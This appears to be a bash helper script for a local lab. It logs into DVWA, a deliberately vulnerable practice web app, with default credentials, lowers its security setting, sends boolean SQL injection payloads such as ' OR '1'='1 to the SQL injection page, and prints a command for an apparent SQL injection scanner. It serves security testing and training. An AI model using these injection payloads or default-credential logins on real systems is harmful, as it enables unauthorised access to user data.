#!/bin/bash
DVWA_URL="http://127.0.0.1"
COOKIE_FILE="cookies.txt"

rm -f "$COOKIE_FILE"

echo "=== Getting Fresh Session ==="

# Get initial session
curl -s -c "$COOKIE_FILE" "$DVWA_URL/login.php" > /dev/null

# Get token
TOKEN=$(curl -s -b "$COOKIE_FILE" "$DVWA_URL/login.php" | grep -oP "user_token.*?value='\K[^']+")
echo "Token: $TOKEN"

# Login
echo "Logging in..."
curl -s -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  "$DVWA_URL/login.php" > /dev/null

# Set security to low
echo "Setting security to low..."
curl -s -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
  -d "security=low&seclev_submit=Submit" \
  "$DVWA_URL/security.php" > /dev/null

# Extract cookie values
PHPSESSID=$(grep PHPSESSID "$COOKIE_FILE" | tail -1 | awk '{print $7}')
SECURITY=$(grep -E "security\s" "$COOKIE_FILE" | tail -1 | awk '{print $7}')

echo
echo "=== Testing Vulnerability ==="
COOKIE_STR="PHPSESSID=$PHPSESSID; security=$SECURITY"

# Test 1: Normal
echo "Test 1 (id=1):"
RESULT1=$(curl -s -b "$COOKIE_FILE" "$DVWA_URL/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -E "(First name|Surname)" | wc -l)
echo "  Lines with 'First name' or 'Surname': $RESULT1"

# Test 2: TRUE
echo "Test 2 (TRUE payload - should show ALL users):"
RESULT2=$(curl -s -b "$COOKIE_FILE" "$DVWA_URL/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" | grep -E "(First name|Surname)" | wc -l)
echo "  Lines with 'First name' or 'Surname': $RESULT2"

# Test 3: FALSE
echo "Test 3 (FALSE payload - should show NO users):"
RESULT3=$(curl -s -b "$COOKIE_FILE" "$DVWA_URL/vulnerabilities/sqli/?id=1'+OR+'1'%3D'2&Submit=Submit" | grep -E "(First name|Surname)" | wc -l)
echo "  Lines with 'First name' or 'Surname': $RESULT3"

echo
if [ "$RESULT2" -gt "$RESULT3" ] && [ "$RESULT2" -gt 2 ]; then
    echo "✓✓✓ VULNERABILITY CONFIRMED! ✓✓✓"
    echo
    echo "Cookie for scanner:"
    echo "$COOKIE_STR"
    echo
    echo "Run this command:"
    echo "cargo run --release -- sqli-scan \\"
    echo "    --target \"http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit\" \\"
    echo "    --confirm-authorized \\"
    echo "    --payload-file payloads/mysql-payloads.yaml \\"
    echo "    --cookies \"$COOKIE_STR\" \\"
    echo "    --max-depth 0 \\"
    echo "    --max-endpoints 1"
else
    echo "✗ Vulnerability test failed or session expired"
    echo "Try running this script again or login manually in browser"
fi

echo
echo "Cookie file saved to: cookies.txt"
